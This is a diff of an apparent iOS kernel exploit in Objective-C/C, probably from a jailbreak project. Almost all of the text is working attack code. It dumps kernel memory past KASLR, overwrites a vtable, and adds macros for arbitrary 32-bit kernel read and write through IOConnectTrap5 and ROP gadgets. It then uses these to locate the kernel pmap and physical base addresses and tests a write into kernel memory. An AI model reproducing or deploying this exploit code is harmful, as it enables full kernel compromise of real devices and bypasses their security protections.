@@ -262,7 +262,7 @@ overlapped = copyinDataFast(pad, 1024 - 0x58);\
     NSLog(@"Dumping the kernel...");
     sleep(1);
     char* kern_dump = calloc(70, 0x10000);
-    for (int i = 1; i < 72; i++) {
+    for (int i = 10; i < 20; i++) {
         ReadToBuf();
         vmcopy->sz = 0x10000;
         vmcopy->ptr = 0xffffff8002002000 + kaslr_slide + i*vmcopy->sz;
@@ -275,7 +275,21 @@ overlapped = copyinDataFast(pad, 1024 - 0x58);\
             continue;
         }
         memcpy(&kern_dump[i*vmcopy->sz], data, vmcopy->sz);
-        usleep(500);
+    }
+    
+    for (int i = 60; i < 70; i++) {
+        ReadToBuf();
+        vmcopy->sz = 0x10000;
+        vmcopy->ptr = 0xffffff8002002000 + kaslr_slide + i*vmcopy->sz;
+        WriteFromBuf();
+        mach_vm_size_t sz = 0;
+        char* data = copyoutDataFastLen(overlapped, &sz);
+        SendOverlapped();
+        
+        if (!data) {
+            continue;
+        }
+        memcpy(&kern_dump[i*vmcopy->sz], data, vmcopy->sz);
     }
     
     NSLog(@"Kernel dumped.");
@@ -324,23 +338,63 @@ overlapped = copyinDataFast(pad, 1024 - 0x58);\
     
     buftable = (uint64_t*) &buf[1024 - 0x58 + 232];
     buftable[0] = 0x4141424243434444;
-    buftable[1] = 0xffffff8002002000 + kaslr_slide + ldr_x0_x1_32;
     buftable[0x25] = 0xffffff8002002000 + kaslr_slide + add_x0_232;
     memcpy(&buf[1024 - 0x58], &buf[2048 + 1024 - 0x58], 32);
     vmcopy->type = kernalloc - 1024 + 0x58;
+    buftable[1] = 0xffffff8002002000 + kaslr_slide + ldr_x0_x1_32;
     WriteFromBuf();
     /* smashed vtable! */
     
+#define WriteWhatWhere32(what, where) \
+buftable[1] = 0xffffff8002002000 + kaslr_slide + str_w1_x2_ret;\
+WriteFromBuf();\
+IOConnectTrap5(conn_, 0, what, where, 0x1337133743434343, 0x1337133744444444, str_w1_x2_ret);
+    
+#define ReadWhere32(where, out) \
+buftable[1] = 0xffffff8002002000 + kaslr_slide + ldr_x0_x1_32;\
+WriteFromBuf();\
+out = IOConnectTrap5(conn_, 0, where - 32, 0x1337133742424242, 0x1337133743434343, 0x1337133744444444, 0x1337133745454545);
+    
+
     NSLog(@"Doing a full kernel dump now..");
 
-    char* real_kern_dump = malloc(0x10000 * 256);
+    uint8_t* real_kern_dump = malloc(0x10000 * 256);
     for (int i = 0; i < 0x10000 * 256; i+=4) {
         uint32_t read = IOConnectTrap5(conn_, 0, 0xffffff8002002000 + kaslr_slide + i - 32, 0x1337133742424242, 0x1337133743434343, 0x1337133744444444, 0x1337133745454545);
         *(uint32_t*) (&real_kern_dump[i]) = read;
     }
     
+
     NSLog(@"Done!");
     
+    uint64_t str_w1_x2_ret = find_str_w1_x2_ret_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
+    uint64_t kernel_pmap = find_pmap_location_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
+    uint64_t pmap_store = *(uint64_t*)(&real_kern_dump[kernel_pmap]);
+    uint64_t pde_base = *(uint64_t*)(&real_kern_dump[pmap_store - (0xffffff8002002000 + kaslr_slide)]);
+    NSLog(@"str_w1_x2_ret: 0x%016llx", str_w1_x2_ret);
+    NSLog(@"kernel_pmap: 0x%016llx", kernel_pmap);
+    NSLog(@"pmap_store: 0x%016llx", pmap_store);
+    NSLog(@"pde_base: 0x%016llx", pde_base);
+
+    uint64_t _physAddr = find_gPhysAddr_64(0xffffff8002002000 + kaslr_slide, &real_kern_dump[0], 0x10000 * 256);
+    uint64_t gPhysBase = *(uint64_t*)(&real_kern_dump[_physAddr]);
+    uint64_t gVirtBase = *(uint64_t*)(&real_kern_dump[_physAddr - 8]);
+
+    NSLog(@"physAddr: 0x%016llx", _physAddr);
+    NSLog(@"physBase: 0x%016llx", gPhysBase);
+    NSLog(@"virtBase: 0x%016llx", gVirtBase);
+
+    NSLog(@"physAddr: 0x%016llx", _physAddr);
+    
+    uint32_t kv = 0;
+    
+    ReadWhere32(kernalloc - 2048, kv);
+    NSLog(@"kv: 0x%016llx", kv);
+    
+    WriteWhatWhere32(0x1337, kernalloc - 2048);
+    
+    ReadWhere32(kernalloc - 2048, kv);
+    NSLog(@"kv: 0x%016llx", kv);
     
     memcpy(&buf[0], &buf[2048], 2048);
     WriteFromBuf();
@@ -380,7 +434,7 @@ overlapped = copyinDataFast(pad, 1024 - 0x58);\
         }
     }
     
-    NSLog(@"Clean");
+    NSLog(@"Cleaning the mess.. ");
     ReadToBuf();
     vmcopy->kfree_size = 0xFFFFFFF0;
     WriteFromBuf();
